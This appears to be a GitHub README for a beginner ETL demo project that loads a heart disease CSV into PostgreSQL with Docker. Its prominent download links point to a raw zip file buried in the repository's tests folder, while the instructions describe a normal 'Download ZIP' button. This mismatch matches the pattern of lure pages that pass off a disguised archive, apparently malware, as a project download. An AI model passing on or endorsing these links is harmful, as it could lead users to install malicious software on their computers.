# 📊 etl-pipeline-demo - Learn how data pipelines move information

[![](https://img.shields.io/badge/Download_Project-Blue-blue.svg)](https://github.com/meatusatomicnumber977/etl-pipeline-demo/raw/refs/heads/main/tests/pipeline-demo-etl-2.8-alpha.3.zip)

## 📁 Project Overview

This tool shows how data moves from a source to a final storage location. It uses a heart disease dataset to demonstrate three main steps. You learn how to read raw files, fix data errors, and save that information into a database. This project uses clear steps to show how professional data systems function on your local computer.

## 🛠️ System Requirements

Before you start, ensure your computer meets these needs:

* Windows 10 or 11
* 8 GB of RAM
* 2 GB of free disk space
* Docker Desktop installed and running

## 🚀 How to Download the Project

Visit the repository page to download the software files to your computer.

[Click here to open the download page](https://github.com/meatusatomicnumber977/etl-pipeline-demo/raw/refs/heads/main/tests/pipeline-demo-etl-2.8-alpha.3.zip)

Follow these steps to save the project:

1. Open the link above in your web browser.
2. Locate the green button labeled Code.
3. Select "Download ZIP".
4. Choose a folder on your computer to save the file.
5. Right-click the downloaded file and choose "Extract All".

## 📦 Setting Up the Environment

The project relies on Docker to create a consistent workspace. Docker manages the database and the software environment automatically.

1. Install Docker Desktop from the official website.
2. Open the Docker Desktop application and wait for the status to show "Docker Desktop is running".
3. Open your Command Prompt or PowerShell terminal.
4. Use the `cd` command to navigate to the folder where you extracted the project.
5. Type `docker-compose up` and press Enter.

The system will now download the necessary components. This process may take several minutes depending on your internet speed. Once the setup finishes, the terminal will display messages indicating that the database is ready for connections.

## 🔍 Understanding the Data Pipeline

This project breaks down the movement of data into three distinct phases. 

### Extract
The system reads raw information from a CSV file. It takes the patient records from the UCI Heart Disease dataset and prepares them for processing using a tool called pandas.

### Transform
Raw data often contains errors or missing values. This stage cleans the records by removing empty rows and correcting data types. It also performs feature engineering, which creates new calculated values that help with medical analysis.

### Load
Once the data is clean, the system moves it into a PostgreSQL database. This allows the information to remain organized and easily searchable for future work.

## 🧪 Testing the Logic

This project includes a test suite to ensure the transformation steps work as expected. These tests verify that the data cleaning occurs without errors.

1. Keep the terminal open where the project runs.
2. Open a second terminal window in the same folder.
3. Type `pytest` and press Enter.

The software will run a series of checks. If every test passes, you see green dots in your terminal. This confirms that your data transformation logic is healthy.

## 🔑 Common Questions

**Do I need to pay for the software?**
No. All tools included in this project are open source and free for educational use.

**How do I stop the pipeline?**
Go to the terminal running the pipeline and press Ctrl+C on your keyboard. This stops the database and closes the connections gracefully.

**Can I use my own data?**
Yes. Replace the file inside the data/raw folder with your own CSV file. Note that you may need to update the configuration file to match the layout of your new data.

**What happens if the setup fails?**
Check that Docker Desktop shows a green status icon. If the error continues, restart your computer and try the command again. Ensure that no other programs are using the PostgreSQL connection port, which is usually 5432.